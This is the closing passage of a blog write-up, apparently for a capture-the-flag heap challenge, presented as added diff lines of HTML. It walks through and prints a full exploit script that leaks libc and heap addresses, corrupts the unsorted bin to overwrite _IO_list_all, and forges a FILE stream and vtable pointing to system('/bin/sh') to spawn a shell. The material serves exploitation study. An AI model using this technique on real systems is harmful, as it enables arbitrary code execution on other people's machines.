+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>malloc()
+</span></span></code></pre></div><p>We get the follwing result now :</p>
+<p><img src="/Images/gdb1.png" alt="alt"></p>
+<p>As we can see that we have overwritten the <code>_IO_list_all ptr</code> with an address inside the main arena and now its
+<code>_chain ptr</code> points to a chunk we control.</p>
+<p>Now we will create a fake file stream in the chunk pointed by <code>_chain</code> and a fake vtable :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Now we are going to create the fake filestream at chunk_F which is being pointed to by the</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># _chain ptr.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting the flag</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>edit(chunk_E, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> flag <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake chunk F part</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting the write base and write ptr to pass the checks.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span>write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span>fakef <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena <span style="color:#f92672">+</span> <span style="color:#ae81ff">168</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span>  p64(write_base) <span style="color:#f92672">+</span> p64(write_ptr) \
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x38</span>
+</span></span><span style="display:flex;"><span>edit(chunk_F, fakef)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake chunk G part</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_G, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_G, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># fake chunk_H part for overwriting the vtable ptr with address of chunk A</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and setting up the fake vtable at the start of heap so that _overflow entry is replaced with system.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_H, p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(heap_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_A, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))
+</span></span></code></pre></div><p>Then we will call the call <code>quit()</code> to trigger the exploit :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># calling the quit option to trigger the exploit</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
+</span></span></code></pre></div><p>Now we get a shell:</p>
+<p><img src="/Images/shell1.png" alt="alt"></p>
+<p>Here is the full exploit :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>chunk_A <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_C <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_D <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_E <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_F <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_G <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_H <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----- Leaking libc base address ----- </span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x91</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_A, payload1)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_C, payload2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_B)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remaindering...</span>
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addresses <span style="color:#f92672">=</span> read(chunk_C)
+</span></span><span style="display:flex;"><span>unsortedbin_addr <span style="color:#f92672">=</span> u64(addresses[:<span style="color:#ae81ff">8</span>])
+</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> unsortedbin_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x58</span>
+</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Leaked libc load address: </span><span style="color:#e6db74">{</span>hex(libc_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_addr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----- Leaking heap address -----</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting up the unsorted chunk.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_D, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x91</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_F, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_E)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> u64(read(chunk_C)[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x180</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Leaked heap address: </span><span style="color:#e6db74">{</span>hex(heap_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Restoring the heap state</span>
+</span></span><span style="display:flex;"><span>edit(chunk_B, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_D, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_C <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_E <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creating 2 chunks to get them linked into the unsorted bin.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_A, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0xc1</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_D, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0xc1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Freeing those chunks</span>
+</span></span><span style="display:flex;"><span>free(chunk_B)
+</span></span><span style="display:flex;"><span>free(chunk_E)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Requesting a chunk due to which remaindering will take place and we will be returned</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># chunk B. chunk C will still be linked into the unsorted bin and it is a chunk we control.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Chunk E will be in the 0xc0 smallbin.</span>
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Overwriting the size of chunk C with 0x31 so that it doesnot get allocated to us again in the next</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># malloc call and instead be sorted. Malloc will then remainder chunk_E and link chunk F into the unsorted bin.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We control chunk F.</span>
+</span></span><span style="display:flex;"><span>edit(chunk_B, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x31</span>))
+</span></span><span style="display:flex;"><span>unsortedbin_head_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x58</span>
+</span></span><span style="display:flex;"><span>edit(chunk_C, p64(unsortedbin_head_addr) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_E <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Since chunk C is now in 0x30 small bin we  will have to relink it again in unsorted bin. </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We are going to overwrite the size field of chunk C with 0x61 to bring it to actual size </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># then we will overwrite size field of chunk D with 0x90 and freeing it</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># which will lead to backward consolidation with chunk C and will get linked into the unsorted bin again.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Hence we have 2 chunks linked into the unsortedbin whom we control completely.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_B, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>smallbin30_head_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x78</span>
+</span></span><span style="display:flex;"><span>edit(chunk_C, p64(smallbin30_head_addr)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x60</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x90</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_E, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>)) <span style="color:#75715e"># For a stable heap since chunk D is now 0x90 sized.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_D)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now the unsorted bin contains chunk C as its first element and chunk_F as its last element.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Since search for a chunk starts from the last of the unsorted bin... </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># what we are going to do is make chunk F 0x68 sized and chunk C 0x60 sized.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># So when malloc starts from last it will sort chunk F into the 0x60 small bin and then allocate chunkC .</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># While allocating chunk C it will partially unlink it so we will overwrite the bk of chunk C with address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 16 bytes before _IO_list_all ptr and as a result _IO_list_all will be overwritten.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_B, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_E, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x69</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_G, p64(<span style="color:#ae81ff">0x58</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Changing the bk of chunk C</span>
+</span></span><span style="display:flex;"><span>edit(chunk_C, p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_IO_list_all <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># calling the final malloc to triger everything</span>
+</span></span><span style="display:flex;"><span>malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now we are going to create the fake filestream at chunk_F which is being pointed to by the</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># _chain ptr.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting the flag</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>edit(chunk_E, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> flag <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake chunk F part</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting the write base and write ptr to pass the checks.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span>write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span>fakef <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena <span style="color:#f92672">+</span> <span style="color:#ae81ff">168</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span>  p64(write_base) <span style="color:#f92672">+</span> p64(write_ptr) \
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x38</span>
+</span></span><span style="display:flex;"><span>edit(chunk_F, fakef)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake chunk G part</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_G, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_G, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># fake chunk_H part for overwriting the vtable ptr with address of chunk A</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and setting up the fake vtable at the start of heap so that _overflow entry is replaced with system.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_H, p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(heap_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_A, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># calling the quit option to trigger the exploit</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2026 0x3nigma, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
